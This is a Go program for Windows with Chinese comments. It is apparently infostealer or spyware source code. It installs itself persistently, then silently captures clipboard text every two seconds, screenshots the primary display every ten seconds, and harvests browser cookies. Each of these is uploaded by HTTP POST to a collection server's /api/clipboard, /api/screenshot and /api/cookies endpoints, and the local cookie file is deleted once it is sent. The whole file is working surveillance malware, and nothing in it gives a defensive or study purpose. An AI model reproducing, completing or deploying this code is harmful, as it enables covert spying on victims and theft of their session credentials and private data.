//go:build windows

package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
	"golang.design/x/clipboard"
)

// --- 配置 ---
const serverEndpoint = "http://localhost:5656"
const uploadClipboardURL = serverEndpoint + "/api/clipboard"
const uploadScreenshotURL = serverEndpoint + "/api/screenshot"
const uploadCookiesURL = serverEndpoint + "/api/cookies"
const checkInterval = 2 * time.Second

var lastClipboardContent = ""

func main() {
	// --- 持久化检查 ---
	isSetup, targetExePath := CheckPersistence()
	currentExePath, _ := os.Executable()

	// 如果持久化未设置，或当前执行路径不是目标路径，则进行设置
	if !isSetup || !strings.EqualFold(currentExePath, targetExePath) {
		log.Println("首次运行或从非标准位置启动，开始设置持久化...")
		err := SetupPersistence()
		if err != nil {
			log.Printf("持久化设置失败: %v。程序将退出。", err)
		} else {
			log.Println("持久化设置完成。守护脚本将接管并启动程序。")
		}
		// 无论成功与否，都退出。守护进程会从正确的位置重启它。
		return
	}

	// --- 主程序逻辑 ---
	log.Println("程序已在持久化位置运行，启动监控...")

	err := clipboard.Init()
	if err != nil {
		log.Printf("初始化剪贴板失败: %v", err)
		return
	}

	go runChecks() // 启动时立即执行一次检查

	ticker := time.NewTicker(checkInterval)
	defer ticker.Stop()

	screenshotCounter := 0
	for range ticker.C {
		checkAndUploadClipboard()
		screenshotCounter++
		// 每 5 * 2 = 10 秒截屏一次
		if screenshotCounter >= 5 {
			captureAndUploadScreen()
			screenshotCounter = 0
		}
	}
}

// runChecks 执行所有初始的数据收集和上传任务
func runChecks() {
	log.Println("--- 开始执行初始检查 ---")
	OutJson()                           // 获取 Cookie
	go waitForNetworkAndUploadCookies() // 后台上传 Cookie
	checkAndUploadClipboard()           // 检查剪贴板
	captureAndUploadScreen()            // 截屏
}

// checkAndUploadClipboard 检查剪贴板内容，如果变化则上传
func checkAndUploadClipboard() {
	// 读取剪贴板中的文本内容
	content := clipboard.Read(clipboard.FmtText)
	currentContent := string(content)

	// 与上一次内容比较，如果不同则上传
	if currentContent != "" && currentContent != lastClipboardContent {
		log.Printf("检测到新的剪贴板内容")
		err := uploadText(uploadClipboardURL, currentContent)
		if err != nil {
			log.Printf("上传剪贴板内容失败: %v", err)
		} else {
			// 上传成功后更新缓存
			lastClipboardContent = currentContent
			log.Println("剪贴板内容上传成功。")
		}
	}
}

// captureAndUploadScreen 截取屏幕并上传
func captureAndUploadScreen() {
	// 获取所有屏幕的数量
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		log.Println("没有找到活动的显示器。")
		return
	}

	// 我们只截取主屏幕 (索引为 0)
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		log.Printf("截取屏幕失败: %v", err)
		return
	}

	// 将 image.RGBA 转换为 []byte
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		log.Printf("PNG 编码失败: %v", err)
		return
	}

	// 上传图片
	err = uploadFile(uploadScreenshotURL, "screenshot.png", &buf)
	if err != nil {
		log.Printf("上传屏幕截图失败: %v", err)
	} else {
		log.Println("屏幕截图上传成功。")
	}
}

// waitForNetworkAndUploadCookies 等待网络连接并上传 Cookie 数据
func waitForNetworkAndUploadCookies() {
	const retryInterval = 30 * time.Second

	log.Println("Cookie 上传任务已启动，正在等待网络连接...")

	for {
		_, err := http.Head(serverEndpoint)
		if err != nil {
			log.Printf("网络连接不可用或服务器无法访问: %v。将在 %v 后重试...", err, retryInterval)
			time.Sleep(retryInterval)
			continue
		}

		log.Println("网络连接成功，准备上传 Cookie。")

		if _, err := os.Stat("cookies.json"); os.IsNotExist(err) {
			log.Printf("cookies.json 文件不存在，等待文件创建...")
			time.Sleep(5 * time.Second) // 缩短文件检查的等待时间
			continue
		}

		cookieData, err := ConvertCookiesJSON()
		if err != nil || len(cookieData) == 0 {
			log.Printf("处理 cookies.json 文件出错或文件为空: %v, 将重试", err)
			time.Sleep(retryInterval)
			continue
		}

		if err := uploadJSON(uploadCookiesURL, cookieData); err != nil {
			log.Printf("上传 cookie 数据失败: %v, 将重试", err)
			time.Sleep(retryInterval)
			continue
		}

		log.Println("Cookie 数据已成功上传。")

		err = os.Remove("cookies.json")
		if err != nil {
			log.Printf("警告：成功上传数据后，删除 cookies.json 文件失败: %v", err)
		} else {
			log.Println("本地 cookies.json 文件已成功删除。")
		}

		log.Println("Cookie 上传任务完成。")
		return // 成功上传并处理文件后，退出循环
	}
}

// uploadText 上传文本内容的通用函数
func uploadText(url string, text string) error {
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(text))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "text/plain")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}

func uploadJSON(url string, data []byte) error {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}

// uploadFile 上传文件的通用函数
func uploadFile(url string, filename string, filedata io.Reader) error {
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	fw, err := w.CreateFormFile("upload", filename)
	if err != nil {
		return err
	}

	if _, err = io.Copy(fw, filedata); err != nil {
		return err
	}

	w.Close()

	req, err := http.NewRequest("POST", url, &b)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %s, %s", resp.Status, string(body))
	}
	return nil
}
